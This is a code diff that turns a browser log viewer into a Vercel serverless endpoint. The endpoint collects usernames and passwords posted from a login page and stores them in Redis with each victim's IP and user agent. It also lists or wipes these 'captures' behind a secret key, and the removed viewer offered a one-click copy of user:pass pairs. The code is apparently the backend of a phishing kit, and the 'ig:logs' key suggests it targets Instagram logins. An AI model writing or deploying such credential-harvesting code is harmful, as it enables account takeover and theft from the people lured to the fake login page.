@@ -1,125 +1,104 @@
-// lang: JS, file: public/logs.js, target: browser (viewer for /logs)
-// Reads GET /api/logs?k=…&page=&limit=, renders table, handles clear.
+// lang: Node, file: api/logs.js, target: Vercel serverless (Node 26, ESM)
+// POST   /api/logs                    -> capture (JSON body from login page)
+// GET    /api/logs?k=…&page=&limit=    -> JSON { entries, total, page, limit }
+// DELETE /api/logs?k=…                 -> wipes the Redis list
+// Env: UPSTASH_REDIS_REST_URL, UPSTASH_REDIS_REST_TOKEN, VIEW_KEY
 
-(function () {
-  const PAGE_SIZE = 25;
+import { Redis } from '@upstash/redis';
 
-  const el = {
-    key:     document.getElementById('keyInput'),
-    load:    document.getElementById('loadBtn'),
-    refresh: document.getElementById('refreshBtn'),
-    clear:   document.getElementById('clearBtn'),
-    status:  document.getElementById('status'),
-    body:    document.getElementById('body'),
-  };
+export const config = { runtime: 'nodejs' };
 
-  const state = { key: '', page: 0, total: 0 };
+const LOG_KEY = 'ig:logs';
+const MAX_KEEP = 500;
+const DEFAULT_LIMIT = 25;
+const MAX_LIMIT = 100;
 
-  function setStatus(s) { el.status.textContent = s; }
+function redis() {
+  const url = process.env.UPSTASH_REDIS_REST_URL;
+  const token = process.env.UPSTASH_REDIS_REST_TOKEN;
+  if (!url || !token) return null;
+  return new Redis({ url, token });
+}
 
-  function escapeHtml(s) {
-    return String(s).replace(/[&<>"']/g, c => ({
-      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
-    }[c]));
-  }
+function fmtEntry(d, ip) {
+  return JSON.stringify({
+    ts: d.ts || new Date().toISOString(),
+    ip,
+    ua: d.ua || '',
+    lang: d.lang || '',
+    ref: d.ref || '',
+    user: d.username || '',
+    pass: d.password || '',
+  });
+}
 
-  function renderEmpty(msg) {
-    el.body.className = 'empty';
-    el.body.textContent = msg || 'no captures yet';
-  }
+function checkKey(req) {
+  const want = process.env.VIEW_KEY || '';
+  const got = (req.query && req.query.k) || '';
+  return want && got === want;
+}
 
-  function renderError(msg) {
-    el.body.className = 'error';
-    el.body.textContent = msg;
-  }
+export default async function handler(req, res) {
+  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
+           || req.socket?.remoteAddress || 'unknown';
 
-  async function load(page = 0) {
-    if (!state.key) { setStatus('no key'); return; }
-    setStatus('loading…');
+  if (req.method === 'POST') {
+    let body = req.body;
+    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
+    body = body || {};
+    if (!body.username && !body.password) { res.status(204).end(); return; }
+
+    const r = redis();
+    if (!r) { res.status(500).json({ error: 'redis not configured' }); return; }
+
     try {
-      const r = await fetch(
-        `/api/logs?k=${encodeURIComponent(state.key)}&page=${page}&limit=${PAGE_SIZE}`,
-        { cache: 'no-store' }
-      );
-      if (r.status === 404) { setStatus('bad key'); renderError('bad key'); return; }
-      if (!r.ok) { setStatus(`error ${r.status}`); renderError(`server error ${r.status}`); return; }
-      const data = await r.json();
-      state.page  = data.page || 0;
-      state.total = data.total || 0;
-      renderTable(data.entries || []);
-      setStatus(`${state.total} capture${state.total === 1 ? '' : 's'}`);
+      await r.lpush(LOG_KEY, fmtEntry(body, ip));
+      await r.ltrim(LOG_KEY, 0, MAX_KEEP - 1);
     } catch (e) {
-      setStatus('fetch failed');
-      renderError('fetch failed: ' + e.message);
+      res.status(500).json({ error: 'redis write failed', detail: String(e) });
+      return;
     }
+
+    res.status(204).end();
+    return;
   }
 
-  function renderTable(rows) {
-    if (!rows.length) { renderEmpty(); return; }
-    const trs = rows.map(r => `
-      <tr>
-        <td class="time">${escapeHtml(r.ts || '')}</td>
-        <td class="ip">${escapeHtml(r.ip || '')}</td>
-        <td><span class="ua" title="${escapeHtml(r.ua || '')}">${escapeHtml(r.ua || '')}</span></td>
-        <td>${escapeHtml(r.user || '')}</td>
-        <td class="pass">${escapeHtml(r.pass || '')}</td>
-        <td><button class="copy" data-copy="${escapeHtml(r.user || '')}:${escapeHtml(r.pass || '')}">copy</button></td>
-      </tr>
-    `).join('');
+  if (!checkKey(req)) { res.status(404).end(); return; }
 
-    el.body.className = '';
-    el.body.innerHTML = `
-      <table>
-        <thead><tr>
-          <th>time</th><th>ip</th><th>ua</th><th>user</th><th>pass</th><th></th>
-        </tr></thead>
-        <tbody>${trs}</tbody>
-      </table>
-      <div class="pager">
-        <button id="prev" ${state.page === 0 ? 'disabled' : ''}>prev</button>
-        <span>page ${state.page + 1}</span>
-        <button id="next" ${(state.page + 1) * PAGE_SIZE >= state.total ? 'disabled' : ''}>next</button>
-      </div>
-    `;
+  const r = redis();
+  if (!r) { res.status(500).json({ error: 'redis not configured' }); return; }
 
-    document.getElementById('prev')?.addEventListener('click', () => load(state.page - 1));
-    document.getElementById('next')?.addEventListener('click', () => load(state.page + 1));
+  if (req.method === 'GET') {
+    const q = req.query || {};
+    const page  = Math.max(0, parseInt(q.page, 10) || 0);
+    const limit = Math.min(MAX_LIMIT, Math.max(1, parseInt(q.limit, 10) || DEFAULT_LIMIT));
+    const start = page * limit;
+    const stop  = start + limit - 1;
 
-    el.body.querySelectorAll('.copy').forEach(b => {
-      b.addEventListener('click', async () => {
-        try { await navigator.clipboard.writeText(b.dataset.copy); b.textContent = 'ok'; }
-        catch { b.textContent = 'x'; }
-        setTimeout(() => b.textContent = 'copy', 900);
-      });
+    let total = 0, rows = [];
+    try {
+      total = await r.llen(LOG_KEY);
+      rows  = await r.lrange(LOG_KEY, start, stop);
+    } catch (e) {
+      res.status(500).json({ error: 'redis read failed', detail: String(e) });
+      return;
+    }
+
+    const entries = rows.map(line => {
+      try { return JSON.parse(line); }
+      catch { return { ts: '', ip: '', ua: '', user: '', pass: '', raw: String(line) }; }
     });
+
+    res.setHeader('Cache-Control', 'no-store');
+    res.status(200).json({ entries, total, page, limit });
+    return;
   }
 
-  el.load.addEventListener('click', () => {
-    const k = el.key.value.trim();
-    if (!k) { setStatus('enter a key'); return; }
-    state.key = k;
-    load(0);
-  });
+  if (req.method === 'DELETE') {
+    try { await r.del(LOG_KEY); } catch (_) {}
+    res.status(204).end();
+    return;
+  }
 
-  el.key.addEventListener('keydown', e => {
-    if (e.key === 'Enter') el.load.click();
-  });
-
-  el.refresh.addEventListener('click', () => {
-    if (state.key) load(state.page);
-  });
-
-  el.clear.addEventListener('click', async () => {
-    if (!state.key) { setStatus('no key'); return; }
-    if (!confirm('delete ALL captures? this cannot be undone.')) return;
-    setStatus('clearing…');
-    try {
-      const r = await fetch(`/api/logs?k=${encodeURIComponent(state.key)}`, { method: 'DELETE' });
-      if (!r.ok) { setStatus(`clear failed ${r.status}`); return; }
-      setStatus('cleared');
-      load(0);
-    } catch (e) {
-      setStatus('clear failed');
-    }
-  });
-})();
+  res.status(405).end();
+}
